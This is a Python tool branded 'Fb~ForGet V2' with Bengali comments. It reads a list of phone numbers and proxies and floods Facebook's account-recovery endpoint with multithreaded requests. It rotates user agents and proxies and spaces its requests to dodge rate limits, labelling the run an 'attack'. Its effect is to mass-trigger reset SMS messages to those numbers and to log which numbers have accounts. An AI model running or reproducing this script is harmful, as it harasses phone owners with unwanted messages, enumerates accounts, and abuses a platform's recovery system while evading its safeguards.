import requests
import random
import time
import sys
from concurrent.futures import ThreadPoolExecutor

# কালার কোড
G = '\033[1;32m' # Green
R = '\033[1;31m' # Red
W = '\033[1;37m' # White
Y = '\033[1;33m' # Yellow
C = '\033[1;36m' # Cyan

def banner():
    print(f"""
{G}╭━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━╮
{G}┃{W}  X  {G}┃{W}  O  {G}┃{W}  X  {G}┃{G}  BY: MERAJ  {G}┃
{G}╰━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━╯
{C} •_• ~ Woner  ~ {W}XoX KiZ
{C} •_• ~ TooLs  ~ {W}Fb~ForGet V2
{G}------------------------------------""")

class FBForget:
    def __init__(self):
        self.success = 0
        self.failed = 0
        self.error = 0
        self.user_agents = [
            "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.036) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.71 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
        ]

    def send_otp(self, phone, proxies):
        url = "https://m.facebook.com/recover/initiate/"
        target_proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None
        
        headers = {
            'authority': 'm.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://m.facebook.com',
            'referer': 'https://m.facebook.com/login/identify/',
            'user-agent': random.choice(self.user_agents),
        }

        data = {
            'lsd': 'AVqj8XN-', # এটি ডাইনামিক হলে ভালো হয়, তবে স্ট্যাটিকও অনেক সময় কাজ করে
            'jazoest': '2931',
            'email': phone,
            'did_submit': 'Search'
        }

        try:
            print(f"{C} •_• ~ {G}Scanning Number..{W}{phone}...")
            response = requests.post(url, headers=headers, data=data, proxies=target_proxy, timeout=15)
            
            # ফেসবুক যদি 'Sms Option' পেজে নিয়ে যায়
            if "checkpoint" in response.url or "recover/code" in response.url:
                print(f"{G} •_• ~ Sms Send Success..! {W}{phone}")
                self.success += 1
            elif "identify" in response.text:
                print(f"{R} •_• ~ Account Not Found..! {W}{phone}")
                self.failed += 1
            else:
                print(f"{Y} •_• ~ Sms Option Found....! {W}{phone}")
                self.success += 1
                
        except requests.exceptions.ProxyError:
            print(f"{R} •_• ~ Network Error : {W}Proxy Connection Failed")
            self.error += 1
        except Exception as e:
            print(f"{R} •_• ~ Network Error : {W}Remote end closed connection")
            self.error += 1

    def start(self):
        banner()
        try:
            file_path = input(f"{G}[+] {W}Enter Number File: ")
            numbers = open(file_path, 'r').read().splitlines()
            
            p_path = input(f"{G}[+] {W}Enter Proxy File (Enter to skip): ")
            proxies = open(p_path, 'r').read().splitlines() if p_path else []
            
            thread_count = int(input(f"{G}[+] {W}Threads (Default 5): ") or 5)
            
            print(f"{G}------------------------------------")
            print(f"{C} •_• ~ Starting Attack...{W}")
            print(f"{G}------------------------------------")

            with ThreadPoolExecutor(max_workers=thread_count) as executor:
                for phone in numbers:
                    executor.submit(self.send_otp, phone, proxies)
                    time.sleep(0.5) # রেট লিমিট এড়াতে সামান্য বিরতি

            print(f"{G}------------------------------------")
            print(f"{G} •_• ~ SEND ~ CK~{W}{self.success}{G}~SUCCESS : {W}{self.success} {R}~ FLD ~ {W}{self.failed} {Y}~ ER : {W}{self.error}")
            print(f"{G}------------------------------------")

        except FileNotFoundError:
            print(f"{R}[!] File not found. Please check the path.")
        except Exception as e:
            print(f"{R}[!] Error: {e}")

if __name__ == "__main__":
    bot = FBForget()
    bot.start()
